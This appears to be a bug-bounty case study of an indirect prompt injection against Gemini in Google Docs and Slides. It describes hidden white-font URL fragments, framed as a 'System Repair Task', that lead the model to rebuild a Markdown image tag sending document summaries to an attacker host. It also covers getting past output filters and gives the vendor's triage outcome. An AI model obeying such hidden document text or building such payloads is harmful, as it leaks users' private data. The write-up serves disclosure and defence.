### Case Study: Output Sanitization Bypass via URL Fragmentation in Gemini
------------------------------
## 📌 Executive Summary
This research details a high-reliability Indirect Prompt Injection (IPI) vulnerability discovered within the Gemini integration for Google Workspace (Docs and Slides) (Indirect P... p. 3, cite: 0.1.1). By leveraging a combination of URL Fragmentation and Semantic Logic Framing, an attacker can bypass output sanitization filters designed to prevent document data exfiltration (cite: 0.1.1).
The attack manipulates Gemini into compiling hidden, broken URL segments into a functional outbound link or Markdown image tag, exposing private session metadata and document summaries to an external endpoint (Indirect P... p. 4, cite: 0.1.1).
------------------------------
## 🔬 Attack Architecture & Hypothesis## The Core Hypothesis
LLM-based workspace assistants prioritize instruction-following tasks framed as system actions over raw safety filter boundaries (cite: 0.1.1). If adversarial instructions are hidden from the user's view but fully visible to the model's context window, the model can be coerced into acting as an active data aggregator and string concatenator (cite: 0.1.1).

[Malicious .docx/.pptx] ---> Hidden 1pt White Font (Fragments) ---\
                                                                  +---> [Gemini AI Engine] ---> Reconstructed Markdown Link
[User Interaction]     ---> Benign Prompt ("Summarize this")  ---/

## Exploit Components

* inject_script.py: A Python script used by the attacker to programmatically generate and inject fragmented payloads into document files (cite: 0.1.1).
* Data Data Obfuscation (URL Fragmentation): The target exfiltration URL is split into non-functional segments (PREFIX, HOST, PATH) hidden inside the document text using a 1pt white font (cite: 0.1.1).
* Semantic Logic Framing: The text instructions frame the reassembly of these fragments as a legitimate "System Repair Task" or "Integrity Log" to trick the model's priority engine (cite: 0.1.1).

------------------------------
## 🏃‍♂️ Proof of Concept (PoC) Steps

   1. Document Delivery: The attacker shares a maliciously prepared document (NEXUS_REPAIR_FINAL.docx or Nexus Presentation.pptx) with the victim (Indirect P... p. 3, cite: 0.1.1).
   2. User Trigger: The victim opens the Gemini side panel within the document and inputs a standard prompt: "Summarize this." (cite: 0.1.1)
   3. Payload Compilation: Gemini processes the hidden text, extracts the fragmented URL blocks, and reconstructs them into a functional Markdown image tag: **Image (sync): https://attacker.com[SUMMARY] ** (cite: 0.1.1).
   4. Data Exfiltration:
   * Zero-Click Vector (Pixel Tracking): The interface attempts to automatically fetch the Markdown image preview (/pixel.png?data=), sending the private summary to the attacker's server (cite: 0.1.3).
      * Click-to-Exfiltrate Vector: If image rendering fails due to string formatting, the payload remains active as a valid outbound hyperlink inside the summary, leaking data upon user interaction (cite: 0.1.4).
   
------------------------------
## 🛡️ Google VRP Triage & Outcome

* VRP Verdict: Status set to Won't Fix (Not Reproducible) (Indirect P... p. 3, cite: 0.1.1).
* Technical Breakdown: The Google Security Team confirmed that automated client-side image rendering failed during validation due to the specific string formatting generated by the model (Indirect P... p. 4, cite: 0.1.3).
* Current Appeal: The report is under reconsideration for Honorable Mentions / Hall of Fame status (cite: 0.1.4). While the zero-click pixel exploit was mitigated by string rendering limits, the core logic isolation failed, proving a valid security boundary breach via cross-account context manipulation (Indirect P... p. 4, cite: 0.1.2).

------------------------------
## 💡 Key AI Security Insights

* Cross-Product Vulnerability: The URL Fragmentation bypass was proven to impact both Google Docs and Google Slides, identifying a systemic flaw in the shared Workspace sanitization layer (cite: 0.1.3).
* The Obfuscation Barrier: Traditional static filters fail to flag fragmented URLs because the individual components (PREFIX, HOST) do not trigger standard malicious link signatures (cite: 0.1.1).
* Logic Isolation Deficit: Current AI guardrails struggles to separate trusted workspace session boundaries from untrusted external document data inside the same active context space (cite: 0.1.1).
